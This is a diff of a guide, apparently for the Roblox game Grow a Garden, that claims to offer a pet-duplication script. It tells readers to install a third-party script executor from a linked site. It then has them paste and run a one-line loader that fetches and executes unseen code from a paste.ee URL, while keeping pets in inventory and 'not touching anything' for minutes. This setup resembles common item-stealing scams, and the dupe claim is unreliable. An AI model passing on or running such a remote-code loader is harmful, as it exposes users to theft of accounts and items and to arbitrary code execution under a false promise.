@@ -4,7 +4,9 @@ You want to get the script that can dupe you some pets? Dont worry, because i wi
 The script that i will leave will give you any pet you want, so i'll guide you to get script working.
 (you will already need to have pets in your inventory for it to work)
 
+
 Firstly, download Delta X (Delta Executer). You can install it on this site: https://delta-executor.com/
+(you also can use any other executers, but i used it with delta)
 Put the link in the search tab on any browser, it works anywhere. (or just click on it)
 Choose your device. It can be Android, IOS, Windows
 Use the tutorial to download it (for your device)
@@ -29,7 +31,7 @@ You must have all the requirements met, otherwise the script will not work
 Copy this script:
 loadstring(game:HttpGet("https://paste.ee/r/45uZiHB9"))()
 
-And when you have all the requirements met AND you copied the script to the copybox, press 2nd button (with the joystick)
+And when you have all the requirements met AND you copied the script to the clipboard, press 2nd button (with the joystick)
 You can either press on the "thank you for using delta" to put the code and press execute, OR you can press "execute clipboard"
 After you executed it, the script will start to load (it can also teleport you to other server of grow a garden, just dont touch anything)
 Even if you didnt teleported, dont touch anything. The script loades from 1 to 10 minutes, depends on what device you're using (and the internet)
